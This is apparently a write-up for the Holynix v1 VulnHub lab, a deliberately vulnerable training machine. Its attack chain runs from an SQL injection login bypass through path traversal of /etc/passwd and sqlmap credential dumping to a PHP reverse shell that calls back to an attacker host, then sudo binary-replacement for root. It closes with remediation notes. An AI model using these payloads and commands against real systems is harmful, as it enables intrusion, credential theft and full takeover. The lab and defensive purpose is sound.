# Holynix: v1: CTF Walkthrough

**Target:** Holynix v1 by c4b3rw0lf  
**Difficulty:** Beginner  
**Goal:** Boot 2 Root: obtain root access  
**Source:** [VulnHub](https://www.vulnhub.com/entry/holynix-v1,20/)

---

## Table of Contents

- [1. Reconnaissance](#1-reconnaissance)
- [2. Port Scanning](#2-port-scanning)
- [3. Web Enumeration & SQL Injection](#3-web-enumeration--sql-injection)
- [4. Local File Inclusion (LFI)](#4-local-file-inclusion-lfi)
- [5. Credential Extraction via SQLmap](#5-credential-extraction-via-sqlmap)
- [6. File Upload & Reverse Shell](#6-file-upload--reverse-shell)
- [7. Privilege Escalation](#7-privilege-escalation)
- [8. Remediation Notes](#8-remediation-notes)

---

## 1. Reconnaissance

Discover the target on the local network:

```bash
netdiscover -r 192.168.1.0/24
```

| Field | Value |
|-------|-------|
| Target IP | `192.168.1.105` |
| MAC Address | `<target_mac>` |

---

## 2. Port Scanning

```bash
nmap -p- -A 192.168.1.105
```

| Port | Service | Version |
|------|---------|---------|
| 80/tcp | HTTP | Apache |

Only port 80 is open. All attack surface is web-based.

---

## 3. Web Enumeration & SQL Injection

### 3.1: Browse to Target

```
http://192.168.1.105/
```

A login page is presented.

### 3.2: Test for SQL Injection

Entering `admin/admin` returns an error that reveals the raw SQL query: a clear indicator of **SQL injection**.

**Payload:**

```
Username: ' or 1=1 #
Password: ' or 1=1 #
```

**How it works:**

| Original Query | Injected Query |
|----------------|----------------|
| `SELECT * FROM users WHERE user='$user' AND pass='$pass'` | `SELECT * FROM users WHERE user='' or 1=1 #' AND pass=''` |

The `#` comments out the rest of the query. `1=1` always evaluates to true, bypassing authentication.

**Result:** Logged in as user `Alamo`.

### 3.3: Explore the Application

- Several pages available: Home, Upload, Display File, etc.
- Upload page exists but user `Alamo` lacks upload permissions.
- Run Nikto for further enumeration:

```bash
nikto -h http://192.168.1.105
```

Nikto identifies a potential **LFI/RFI vulnerability**.

---

## 4. Local File Inclusion (LFI)

### 4.1: Intercept Traffic with Burp Suite

1. Select "Email" from the dropdown on the Display File page.
2. Click **Display File**: Burp intercepts the POST request.
3. Observe the parameter: `text_file_name=ssp%2Femail.txt`

### 4.2: Path Traversal

Modify the parameter to traverse to `/etc/passwd`:

```
text_file_name=ssp%2F../../../../../../../../../../etc/passwd
```

**Forward the request.** The response contains the full contents of `/etc/passwd`.

**Extracted users:**

```
root
daemon
bin
sys
...
etenenbaum
alamo
...
```

---

## 5. Credential Extraction via SQLmap

### 5.1: Enumerate Databases

```bash
sqlmap -u 'http://192.168.1.105/index.php?page=login.php' \
  --forms \
  --data='username=etenenbaum' \
  --dbs \
  --batch
```

**Result:** Found database `creds`.

### 5.2: Dump Credentials

```bash
sqlmap -u 'http://192.168.1.105/index.php?page=login.php' \
  --forms \
  --data='username=etenenbaum' \
  -D creds \
  --tables \
  --dump \
  --batch
```

**Result:**

| Username | Password |
|----------|----------|
| etenenbaum | `<extracted_password>` |

---

## 6. File Upload & Reverse Shell

### 6.1: Prepare the Payload

Use a standard PHP reverse shell:

```bash
# Using pentestmonkey's php-reverse-shell
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
```

Edit `shell.php` and set your listener IP/PORT:

```php
$ip = '192.168.1.XXX';   // attacker IP
$port = 1234;             // listener port
```

### 6.2: Package as Gzip Archive

The upload page supports gzip extraction. Package the shell:

```bash
tar -zcvf shell.tar.gz shell.php
```

### 6.3: Upload the Payload

1. Login as `etenenbaum` with the extracted password.
2. Navigate to the **Upload** page.
3. Select `shell.tar.gz`.
4. **Check** "Enable the automatic extraction of gzip archives".
5. Upload.

### 6.4: Locate the Uploaded File

The upload page mentions "Home directory uploader": files go to the user's home directory:

```
http://192.168.1.105/~etenenbaum/
```

Confirm `shell.php` is listed.

### 6.5: Trigger the Reverse Shell

Start a netcat listener on your attacker machine:

```bash
nc -lvp 1234
```

Navigate to the uploaded shell in the browser:

```
http://192.168.1.105/~etenenbaum/shell.php
```

**Result:** Reverse shell received.

```
Linux holynix 2.6.24-19-generic #1 SMP ...
www-data@holynix:~$
```

---

## 7. Privilege Escalation

### 7.1: Check Sudo Permissions

```bash
sudo -l
```

**Result:** User `www-data` can run several commands as root without a password, including:

- `/bin/tar`
- `/bin/cat`
- `/bin/chmod`
- Others...

### 7.2: Binary Replacement Technique

Replace a sudo-allowed binary (`/bin/tar`) with a root shell:

```bash
# 1. Copy bash to a writable directory
cp /bin/bash /tmp/bash

# 2. Change ownership to root
sudo chown root:root /tmp/bash

# 3. Backup the original tar
sudo cp /bin/tar /bin/tar.bak

# 4. Overwrite tar with our bash copy
sudo cp /tmp/bash /bin/tar

# 5. Execute "tar": which is now bash running as root
sudo /bin/tar
```

### 7.3: Verify Root

```bash
id
# uid=0(root) gid=0(root)
```

**Root access achieved.** Challenge complete.

---

## 8. Remediation Notes

| Vulnerability | Recommendation |
|---------------|----------------|
| SQL Injection (authentication bypass) | Use parameterized queries / prepared statements |
| Local File Inclusion | Validate and sanitize file paths; use whitelisting |
| Weak session management | Implement CSRF tokens; validate session server-side |
| Unrestricted gzip extraction | Validate archive contents before extraction |
| User directory web-accessible | Disable directory listings; restrict home directory access |
| Sudo misconfiguration (binary replacement) | Use `NOPASSWD` sparingly; avoid allowing binary overwrites |
| No input validation on uploads | Enforce file type, size, and content validation |

---

## Attack Flow Diagram

```
netdiscover → nmap (port 80 only)
                    ↓
         Web login → SQLi (' or 1=1 #) → Alamo account
                    ↓
         Nikto → LFI detected → /etc/passwd extracted
                    ↓
         SQLmap → creds database → etenenbaum credentials
                    ↓
         Login as etenenbaum → Upload shell.tar.gz (gzip auto-extract)
                    ↓
         http://~etenenbaum/shell.php → netcat reverse shell (www-data)
                    ↓
         sudo -l → /bin/tar allowed as root
                    ↓
         Binary replacement: bash → /bin/tar → sudo /bin/tar → ROOT
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| netdiscover | Network host discovery |
| nmap | Port and service enumeration |
| nikto | Web server vulnerability scanning |
| Burp Suite | HTTP request interception and modification |
| sqlmap | Automated SQL injection and credential extraction |
| tar | Gzip archive creation for upload bypass |
| netcat | Reverse shell listener |

---

## References

- [Holynix v1 on VulnHub](https://www.vulnhub.com/entry/holynix-v1,20/)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [php-reverse-shell: Pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell)
- [GTFOBins: sudo](https://gtfobins.github.io/gtfobins/sudo/)
